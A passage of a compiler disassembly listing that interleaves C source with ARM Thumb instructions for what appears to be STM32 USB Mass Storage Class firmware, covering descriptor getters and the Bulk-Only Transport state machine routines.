 80093c2:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80093c4:	2181      	movs	r1, #129	; 0x81
 80093c6:	4812      	ldr	r0, [pc, #72]	; (8009410 <USBD_MSC_GetFSCfgDesc+0x54>)
 80093c8:	f002 f99c 	bl	800b704 <USBD_GetEpDesc>
 80093cc:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80093ce:	2101      	movs	r1, #1
 80093d0:	480f      	ldr	r0, [pc, #60]	; (8009410 <USBD_MSC_GetFSCfgDesc+0x54>)
 80093d2:	f002 f997 	bl	800b704 <USBD_GetEpDesc>
 80093d6:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80093d8:	68fb      	ldr	r3, [r7, #12]
 80093da:	2b00      	cmp	r3, #0
 80093dc:	d006      	beq.n	80093ec <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80093de:	68fb      	ldr	r3, [r7, #12]
 80093e0:	2200      	movs	r2, #0
 80093e2:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80093e6:	711a      	strb	r2, [r3, #4]
 80093e8:	2200      	movs	r2, #0
 80093ea:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80093ec:	68bb      	ldr	r3, [r7, #8]
 80093ee:	2b00      	cmp	r3, #0
 80093f0:	d006      	beq.n	8009400 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80093f2:	68bb      	ldr	r3, [r7, #8]
 80093f4:	2200      	movs	r2, #0
 80093f6:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80093fa:	711a      	strb	r2, [r3, #4]
 80093fc:	2200      	movs	r2, #0
 80093fe:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009400:	687b      	ldr	r3, [r7, #4]
 8009402:	2220      	movs	r2, #32
 8009404:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009406:	4b02      	ldr	r3, [pc, #8]	; (8009410 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009408:	4618      	mov	r0, r3
 800940a:	3710      	adds	r7, #16
 800940c:	46bd      	mov	sp, r7
 800940e:	bd80      	pop	{r7, pc}
 8009410:	200000e0 	.word	0x200000e0

08009414 <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8009414:	b580      	push	{r7, lr}
 8009416:	b084      	sub	sp, #16
 8009418:	af00      	add	r7, sp, #0
 800941a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 800941c:	2181      	movs	r1, #129	; 0x81
 800941e:	4812      	ldr	r0, [pc, #72]	; (8009468 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009420:	f002 f970 	bl	800b704 <USBD_GetEpDesc>
 8009424:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009426:	2101      	movs	r1, #1
 8009428:	480f      	ldr	r0, [pc, #60]	; (8009468 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 800942a:	f002 f96b 	bl	800b704 <USBD_GetEpDesc>
 800942e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009430:	68fb      	ldr	r3, [r7, #12]
 8009432:	2b00      	cmp	r3, #0
 8009434:	d006      	beq.n	8009444 <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009436:	68fb      	ldr	r3, [r7, #12]
 8009438:	2200      	movs	r2, #0
 800943a:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800943e:	711a      	strb	r2, [r3, #4]
 8009440:	2200      	movs	r2, #0
 8009442:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009444:	68bb      	ldr	r3, [r7, #8]
 8009446:	2b00      	cmp	r3, #0
 8009448:	d006      	beq.n	8009458 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800944a:	68bb      	ldr	r3, [r7, #8]
 800944c:	2200      	movs	r2, #0
 800944e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009452:	711a      	strb	r2, [r3, #4]
 8009454:	2200      	movs	r2, #0
 8009456:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009458:	687b      	ldr	r3, [r7, #4]
 800945a:	2220      	movs	r2, #32
 800945c:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800945e:	4b02      	ldr	r3, [pc, #8]	; (8009468 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 8009460:	4618      	mov	r0, r3
 8009462:	3710      	adds	r7, #16
 8009464:	46bd      	mov	sp, r7
 8009466:	bd80      	pop	{r7, pc}
 8009468:	200000e0 	.word	0x200000e0

0800946c <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 800946c:	b480      	push	{r7}
 800946e:	b083      	sub	sp, #12
 8009470:	af00      	add	r7, sp, #0
 8009472:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 8009474:	687b      	ldr	r3, [r7, #4]
 8009476:	220a      	movs	r2, #10
 8009478:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 800947a:	4b03      	ldr	r3, [pc, #12]	; (8009488 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 800947c:	4618      	mov	r0, r3
 800947e:	370c      	adds	r7, #12
 8009480:	46bd      	mov	sp, r7
 8009482:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009486:	4770      	bx	lr
 8009488:	20000100 	.word	0x20000100

0800948c <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 800948c:	b480      	push	{r7}
 800948e:	b083      	sub	sp, #12
 8009490:	af00      	add	r7, sp, #0
 8009492:	6078      	str	r0, [r7, #4]
 8009494:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8009496:	683b      	ldr	r3, [r7, #0]
 8009498:	2b00      	cmp	r3, #0
 800949a:	d101      	bne.n	80094a0 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 800949c:	2303      	movs	r3, #3
 800949e:	e009      	b.n	80094b4 <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 80094a0:	687b      	ldr	r3, [r7, #4]
 80094a2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80094a6:	687a      	ldr	r2, [r7, #4]
 80094a8:	33b0      	adds	r3, #176	; 0xb0
 80094aa:	009b      	lsls	r3, r3, #2
 80094ac:	4413      	add	r3, r2
 80094ae:	683a      	ldr	r2, [r7, #0]
 80094b0:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 80094b2:	2300      	movs	r3, #0
}
 80094b4:	4618      	mov	r0, r3
 80094b6:	370c      	adds	r7, #12
 80094b8:	46bd      	mov	sp, r7
 80094ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80094be:	4770      	bx	lr

080094c0 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 80094c0:	b580      	push	{r7, lr}
 80094c2:	b084      	sub	sp, #16
 80094c4:	af00      	add	r7, sp, #0
 80094c6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80094c8:	687b      	ldr	r3, [r7, #4]
 80094ca:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80094ce:	687b      	ldr	r3, [r7, #4]
 80094d0:	32b0      	adds	r2, #176	; 0xb0
 80094d2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80094d6:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80094d8:	68fb      	ldr	r3, [r7, #12]
 80094da:	2b00      	cmp	r3, #0
 80094dc:	d039      	beq.n	8009552 <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 80094de:	68fb      	ldr	r3, [r7, #12]
 80094e0:	2200      	movs	r2, #0
 80094e2:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 80094e4:	68fb      	ldr	r3, [r7, #12]
 80094e6:	2200      	movs	r2, #0
 80094e8:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 80094ea:	68fb      	ldr	r3, [r7, #12]
 80094ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094f0:	2200      	movs	r2, #0
 80094f2:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 80094f6:	68fb      	ldr	r3, [r7, #12]
 80094f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094fc:	2200      	movs	r2, #0
 80094fe:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 8009502:	68fb      	ldr	r3, [r7, #12]
 8009504:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009508:	2200      	movs	r2, #0
 800950a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 800950e:	687b      	ldr	r3, [r7, #4]
 8009510:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009514:	687a      	ldr	r2, [r7, #4]
 8009516:	33b0      	adds	r3, #176	; 0xb0
 8009518:	009b      	lsls	r3, r3, #2
 800951a:	4413      	add	r3, r2
 800951c:	685b      	ldr	r3, [r3, #4]
 800951e:	681b      	ldr	r3, [r3, #0]
 8009520:	2000      	movs	r0, #0
 8009522:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 8009524:	4b0d      	ldr	r3, [pc, #52]	; (800955c <MSC_BOT_Init+0x9c>)
 8009526:	781b      	ldrb	r3, [r3, #0]
 8009528:	4619      	mov	r1, r3
 800952a:	6878      	ldr	r0, [r7, #4]
 800952c:	f003 fc8a 	bl	800ce44 <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 8009530:	4b0b      	ldr	r3, [pc, #44]	; (8009560 <MSC_BOT_Init+0xa0>)
 8009532:	781b      	ldrb	r3, [r3, #0]
 8009534:	4619      	mov	r1, r3
 8009536:	6878      	ldr	r0, [r7, #4]
 8009538:	f003 fc84 	bl	800ce44 <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800953c:	4b07      	ldr	r3, [pc, #28]	; (800955c <MSC_BOT_Init+0x9c>)
 800953e:	7819      	ldrb	r1, [r3, #0]
 8009540:	68fb      	ldr	r3, [r7, #12]
 8009542:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009546:	3210      	adds	r2, #16
 8009548:	231f      	movs	r3, #31
 800954a:	6878      	ldr	r0, [r7, #4]
 800954c:	f003 fdb8 	bl	800d0c0 <USBD_LL_PrepareReceive>
 8009550:	e000      	b.n	8009554 <MSC_BOT_Init+0x94>
    return;
 8009552:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009554:	3710      	adds	r7, #16
 8009556:	46bd      	mov	sp, r7
 8009558:	bd80      	pop	{r7, pc}
 800955a:	bf00      	nop
 800955c:	2000010b 	.word	0x2000010b
 8009560:	2000010a 	.word	0x2000010a

08009564 <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 8009564:	b580      	push	{r7, lr}
 8009566:	b084      	sub	sp, #16
 8009568:	af00      	add	r7, sp, #0
 800956a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800956c:	687b      	ldr	r3, [r7, #4]
 800956e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009572:	687b      	ldr	r3, [r7, #4]
 8009574:	32b0      	adds	r2, #176	; 0xb0
 8009576:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800957a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800957c:	68fb      	ldr	r3, [r7, #12]
 800957e:	2b00      	cmp	r3, #0
 8009580:	d01c      	beq.n	80095bc <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 8009582:	68fb      	ldr	r3, [r7, #12]
 8009584:	2200      	movs	r2, #0
 8009586:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009588:	68fb      	ldr	r3, [r7, #12]
 800958a:	2201      	movs	r2, #1
 800958c:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 800958e:	4b0d      	ldr	r3, [pc, #52]	; (80095c4 <MSC_BOT_Reset+0x60>)
 8009590:	781b      	ldrb	r3, [r3, #0]
 8009592:	4619      	mov	r1, r3
 8009594:	6878      	ldr	r0, [r7, #4]
 8009596:	f003 fcc1 	bl	800cf1c <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 800959a:	4b0b      	ldr	r3, [pc, #44]	; (80095c8 <MSC_BOT_Reset+0x64>)
 800959c:	781b      	ldrb	r3, [r3, #0]
 800959e:	4619      	mov	r1, r3
 80095a0:	6878      	ldr	r0, [r7, #4]
 80095a2:	f003 fcbb 	bl	800cf1c <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80095a6:	4b08      	ldr	r3, [pc, #32]	; (80095c8 <MSC_BOT_Reset+0x64>)
 80095a8:	7819      	ldrb	r1, [r3, #0]
 80095aa:	68fb      	ldr	r3, [r7, #12]
 80095ac:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80095b0:	3210      	adds	r2, #16
 80095b2:	231f      	movs	r3, #31
 80095b4:	6878      	ldr	r0, [r7, #4]
 80095b6:	f003 fd83 	bl	800d0c0 <USBD_LL_PrepareReceive>
 80095ba:	e000      	b.n	80095be <MSC_BOT_Reset+0x5a>
    return;
 80095bc:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80095be:	3710      	adds	r7, #16
 80095c0:	46bd      	mov	sp, r7
 80095c2:	bd80      	pop	{r7, pc}
 80095c4:	2000010a 	.word	0x2000010a
 80095c8:	2000010b 	.word	0x2000010b

080095cc <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 80095cc:	b480      	push	{r7}
 80095ce:	b085      	sub	sp, #20
 80095d0:	af00      	add	r7, sp, #0
 80095d2:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095d4:	687b      	ldr	r3, [r7, #4]
 80095d6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095da:	687b      	ldr	r3, [r7, #4]
 80095dc:	32b0      	adds	r2, #176	; 0xb0
 80095de:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095e2:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 80095e4:	68fb      	ldr	r3, [r7, #12]
 80095e6:	2b00      	cmp	r3, #0
 80095e8:	d002      	beq.n	80095f0 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 80095ea:	68fb      	ldr	r3, [r7, #12]
 80095ec:	2200      	movs	r2, #0
 80095ee:	721a      	strb	r2, [r3, #8]
  }
}
 80095f0:	bf00      	nop
 80095f2:	3714      	adds	r7, #20
 80095f4:	46bd      	mov	sp, r7
 80095f6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80095fa:	4770      	bx	lr

080095fc <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80095fc:	b580      	push	{r7, lr}
 80095fe:	b084      	sub	sp, #16
 8009600:	af00      	add	r7, sp, #0
 8009602:	6078      	str	r0, [r7, #4]
 8009604:	460b      	mov	r3, r1
 8009606:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009608:	687b      	ldr	r3, [r7, #4]
 800960a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800960e:	687b      	ldr	r3, [r7, #4]
 8009610:	32b0      	adds	r2, #176	; 0xb0
 8009612:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009616:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009618:	68fb      	ldr	r3, [r7, #12]
 800961a:	2b00      	cmp	r3, #0
 800961c:	d022      	beq.n	8009664 <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 800961e:	68fb      	ldr	r3, [r7, #12]
 8009620:	7a1b      	ldrb	r3, [r3, #8]
 8009622:	2b02      	cmp	r3, #2
 8009624:	d005      	beq.n	8009632 <MSC_BOT_DataIn+0x36>
 8009626:	2b02      	cmp	r3, #2
 8009628:	db1e      	blt.n	8009668 <MSC_BOT_DataIn+0x6c>
 800962a:	3b03      	subs	r3, #3
 800962c:	2b01      	cmp	r3, #1
 800962e:	d81b      	bhi.n	8009668 <MSC_BOT_DataIn+0x6c>
 8009630:	e013      	b.n	800965a <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009632:	68fb      	ldr	r3, [r7, #12]
 8009634:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009638:	7f59      	ldrb	r1, [r3, #29]
 800963a:	68fb      	ldr	r3, [r7, #12]
 800963c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009640:	331f      	adds	r3, #31
 8009642:	461a      	mov	r2, r3
 8009644:	6878      	ldr	r0, [r7, #4]
 8009646:	f000 f9e5 	bl	8009a14 <SCSI_ProcessCmd>
 800964a:	4603      	mov	r3, r0
 800964c:	2b00      	cmp	r3, #0
 800964e:	da0d      	bge.n	800966c <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009650:	2101      	movs	r1, #1
 8009652:	6878      	ldr	r0, [r7, #4]
 8009654:	f000 f920 	bl	8009898 <MSC_BOT_SendCSW>
      }
      break;
 8009658:	e008      	b.n	800966c <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800965a:	2100      	movs	r1, #0
 800965c:	6878      	ldr	r0, [r7, #4]
 800965e:	f000 f91b 	bl	8009898 <MSC_BOT_SendCSW>
      break;
 8009662:	e004      	b.n	800966e <MSC_BOT_DataIn+0x72>
    return;
 8009664:	bf00      	nop
 8009666:	e002      	b.n	800966e <MSC_BOT_DataIn+0x72>

    default:
      break;
 8009668:	bf00      	nop
 800966a:	e000      	b.n	800966e <MSC_BOT_DataIn+0x72>
      break;
 800966c:	bf00      	nop
  }
}
 800966e:	3710      	adds	r7, #16
 8009670:	46bd      	mov	sp, r7
 8009672:	bd80      	pop	{r7, pc}

08009674 <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009674:	b580      	push	{r7, lr}
 8009676:	b084      	sub	sp, #16
 8009678:	af00      	add	r7, sp, #0
 800967a:	6078      	str	r0, [r7, #4]
 800967c:	460b      	mov	r3, r1
 800967e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009680:	687b      	ldr	r3, [r7, #4]
 8009682:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009686:	687b      	ldr	r3, [r7, #4]
 8009688:	32b0      	adds	r2, #176	; 0xb0
 800968a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800968e:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009690:	68fb      	ldr	r3, [r7, #12]
 8009692:	2b00      	cmp	r3, #0
 8009694:	d01e      	beq.n	80096d4 <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009696:	68fb      	ldr	r3, [r7, #12]
 8009698:	7a1b      	ldrb	r3, [r3, #8]
 800969a:	2b00      	cmp	r3, #0
 800969c:	d002      	beq.n	80096a4 <MSC_BOT_DataOut+0x30>
 800969e:	2b01      	cmp	r3, #1
 80096a0:	d004      	beq.n	80096ac <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 80096a2:	e01a      	b.n	80096da <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 80096a4:	6878      	ldr	r0, [r7, #4]
 80096a6:	f000 f81b 	bl	80096e0 <MSC_BOT_CBW_Decode>
      break;
 80096aa:	e016      	b.n	80096da <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80096ac:	68fb      	ldr	r3, [r7, #12]
 80096ae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096b2:	7f59      	ldrb	r1, [r3, #29]
 80096b4:	68fb      	ldr	r3, [r7, #12]
 80096b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096ba:	331f      	adds	r3, #31
 80096bc:	461a      	mov	r2, r3
 80096be:	6878      	ldr	r0, [r7, #4]
 80096c0:	f000 f9a8 	bl	8009a14 <SCSI_ProcessCmd>
 80096c4:	4603      	mov	r3, r0
 80096c6:	2b00      	cmp	r3, #0
 80096c8:	da06      	bge.n	80096d8 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80096ca:	2101      	movs	r1, #1
 80096cc:	6878      	ldr	r0, [r7, #4]
 80096ce:	f000 f8e3 	bl	8009898 <MSC_BOT_SendCSW>
      break;
 80096d2:	e001      	b.n	80096d8 <MSC_BOT_DataOut+0x64>
    return;
 80096d4:	bf00      	nop
 80096d6:	e000      	b.n	80096da <MSC_BOT_DataOut+0x66>
      break;
 80096d8:	bf00      	nop
  }
}
 80096da:	3710      	adds	r7, #16
 80096dc:	46bd      	mov	sp, r7
 80096de:	bd80      	pop	{r7, pc}

080096e0 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 80096e0:	b580      	push	{r7, lr}
 80096e2:	b084      	sub	sp, #16
 80096e4:	af00      	add	r7, sp, #0
 80096e6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096e8:	687b      	ldr	r3, [r7, #4]
 80096ea:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096ee:	687b      	ldr	r3, [r7, #4]
 80096f0:	32b0      	adds	r2, #176	; 0xb0
 80096f2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096f6:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096f8:	68fb      	ldr	r3, [r7, #12]
 80096fa:	2b00      	cmp	r3, #0
 80096fc:	f000 8085 	beq.w	800980a <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009700:	68fb      	ldr	r3, [r7, #12]
 8009702:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009706:	695b      	ldr	r3, [r3, #20]
 8009708:	68fa      	ldr	r2, [r7, #12]
 800970a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800970e:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 8009710:	68fb      	ldr	r3, [r7, #12]
 8009712:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009716:	699b      	ldr	r3, [r3, #24]
 8009718:	68fa      	ldr	r2, [r7, #12]
 800971a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800971e:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009720:	4b3d      	ldr	r3, [pc, #244]	; (8009818 <MSC_BOT_CBW_Decode+0x138>)
 8009722:	781b      	ldrb	r3, [r3, #0]
 8009724:	4619      	mov	r1, r3
 8009726:	6878      	ldr	r0, [r7, #4]
 8009728:	f003 fd02 	bl	800d130 <USBD_LL_GetRxDataSize>
 800972c:	4603      	mov	r3, r0
 800972e:	2b1f      	cmp	r3, #31
 8009730:	d118      	bne.n	8009764 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009732:	68fb      	ldr	r3, [r7, #12]
 8009734:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009738:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 800973a:	4a38      	ldr	r2, [pc, #224]	; (800981c <MSC_BOT_CBW_Decode+0x13c>)
 800973c:	4293      	cmp	r3, r2
 800973e:	d111      	bne.n	8009764 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009740:	68fb      	ldr	r3, [r7, #12]
 8009742:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009746:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009748:	2b01      	cmp	r3, #1
 800974a:	d80b      	bhi.n	8009764 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 800974c:	68fb      	ldr	r3, [r7, #12]
 800974e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009752:	7f9b      	ldrb	r3, [r3, #30]
 8009754:	2b00      	cmp	r3, #0
